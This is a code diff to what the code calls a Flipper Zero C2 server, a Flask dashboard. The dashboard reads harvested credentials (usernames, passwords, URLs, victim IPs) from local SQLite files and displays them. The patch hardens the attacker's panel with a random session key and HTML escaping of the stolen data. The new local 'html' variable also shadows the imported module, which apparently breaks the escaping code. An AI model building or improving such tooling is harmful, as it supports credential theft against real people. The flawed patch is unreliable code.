@@ -7,6 +7,7 @@ import requests
 import random
 import base64
 import json
+import html
 import logging
 import yaml
 
@@ -67,7 +68,7 @@ BCRYPT_PASSWORD_HASH = config.get("BCRYPT_PASSWORD_HASH")
 # ===========================================================
 
 app = Flask(__name__)
-app.secret_key = "FLIPPER_ZERO_SECRET_C2_KEY_9988" # Digunakan untuk mengamankan data sesi login
+app.secret_key = os.urandom(32) # Kunci sesi dinamis untuk mencegah pembajakan sesi
 socketio = SocketIO(app, async_mode='threading', cors_allowed_origins="*")
 
 # ================== STATE MANAJEMEN C2 REAL-TIME ==================
@@ -4198,35 +4199,38 @@ def report():
     import sqlite3
     import urllib.parse
     import json
+    import html
     
     db_files = glob.glob('*.db')
     all_data = []
     domain_counts = {}
 
     for db_file in db_files:
-        try:
-            conn = sqlite3.connect(db_file)
-            c = conn.cursor()
-            c.execute("SELECT * FROM credentials")
-            rows = c.fetchall()
-            for r in rows:
-                os_val, ip_val, url_val, user_val, pass_val, ts_val = r
-                domain = urllib.parse.urlparse(url_val).netloc or url_val[:30]
-                domain_counts[domain] = domain_counts.get(domain, 0) + 1
-                all_data.append({
-                    "db": db_file, "os": os_val, "ip": ip_val, 
-                    "url": url_val, "domain": domain,
-                    "user": user_val, "pass": pass_val, "ts": ts_val
-                })
-            conn.close()
-        except:
-            pass
+        conn = sqlite3.connect(db_file)
+        c = conn.cursor()
+        c.execute("SELECT * FROM credentials")
+        rows = c.fetchall()
+        for r in rows:
+            os_val, ip_val, url_val, user_val, pass_val, ts_val = r if len(r) == 6 else (r[0], r[1], r[2], r[3], r[4], "N/A") # Defensive unpacking
+            domain = urllib.parse.urlparse(url_val).netloc or url_val[:30]
+            domain_counts[domain] = domain_counts.get(domain, 0) + 1
+            # Melakukan HTML escaping pada semua data untuk mencegah Stored XSS
+            all_data.append({
+                "db": html.escape(db_file), 
+                "os": html.escape(str(os_val)), 
+                "ip": html.escape(str(ip_val)), 
+                "url": html.escape(str(url_val)), 
+                "domain": html.escape(str(domain)),
+                "user": html.escape(str(user_val)), 
+                "pass": html.escape(str(pass_val)), 
+                "ts": html.escape(str(ts_val))
+            })
+        conn.close()
 
     top_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:4]
     
-    # DevSecOps Patch: Sanitasi JSON untuk inline-JS menghindari XSS dan escape error
-    safe_json_data = json.dumps(all_data).replace("<", "\\u003c").replace(">", "\\u003e")
-    
+    # Data sekarang aman untuk di-embed ke dalam JavaScript
+    safe_json_data = json.dumps(all_data)
     html = f'''<!DOCTYPE html>
 <html lang="id">
 <head>
